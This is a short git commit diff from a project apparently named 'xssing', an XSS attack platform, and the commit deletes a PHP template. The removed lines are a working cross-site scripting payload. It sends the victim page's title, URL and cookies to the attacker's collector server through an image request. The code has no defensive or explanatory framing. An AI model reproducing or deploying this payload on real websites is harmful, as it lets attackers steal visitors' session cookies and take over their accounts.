a9924619973618c0c46487bcb9ee6c57a457b483
iFurySt <hk326459@163.com>
2016-08-22 16:49:25 +0800

    clear

--- xssing/apps/index/view/index/index.tpl.php
+++
@@ -1,4 +0,0 @@
-<?php  echo  "var  bid={$browser->bid}; var xingUrl='".SITE_ROOT."index.php';"  ?>
-
- (function() { (new Image()).src =  xingUrl+"?bid="+bid+"&a=info&title="+document.title+"&url=" + escape(document.URL)+'&cookie=' + escape(document.cookie);
-})();
